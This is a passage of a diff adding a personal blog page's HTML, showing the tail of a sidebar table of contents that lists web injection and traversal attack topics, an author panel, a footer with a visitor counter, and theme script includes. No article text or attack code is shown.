href="#%E6%A1%88%E4%BE%8B"><span class="nav-text">案例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88OS-Command-Injection%EF%BC%89"><span class="nav-text">OS命令注入攻击（OS Command Injection）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B-1"><span class="nav-text">案例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88HTTP-Header-Injection%EF%BC%89"><span class="nav-text">HTTP首部注入攻击（HTTP Header Injection）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B-2"><span class="nav-text">案例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP%E5%93%8D%E5%BA%94%E6%88%AA%E6%96%AD%E6%94%BB%E5%87%BB%EF%BC%88HTTP-Response-Splitting-Attack%EF%BC%89"><span class="nav-text">HTTP响应截断攻击（HTTP Response Splitting Attack）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6%E9%A6%96%E9%83%A8%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88Mail-Header-Injection%EF%BC%89"><span class="nav-text">邮件首部注入攻击（Mail Header Injection）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B-3"><span class="nav-text">案例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB%EF%BC%88Directory-Traversal%EF%BC%89"><span class="nav-text">目录遍历攻击（Directory Traversal）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B-4"><span class="nav-text">案例</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88Remote-File-Inclusion%EF%BC%89"><span class="nav-text">远程文件包含漏洞（Remote File Inclusion）</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="姜海鹏"
+      src="/images/avatar-prey-parrot.jpg">
+  <p class="site-author-name" itemprop="name">姜海鹏</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rocsvra" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rocsvra" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:961588918@qq.com" title="E-Mail → mailto:961588918@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">姜海鹏</span>
+</div>
+  <div class="powered-by">Hello Friend
+  </div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    访问量: <span id="busuanzi_value_site_pv"></span> 
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    访问人数：<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
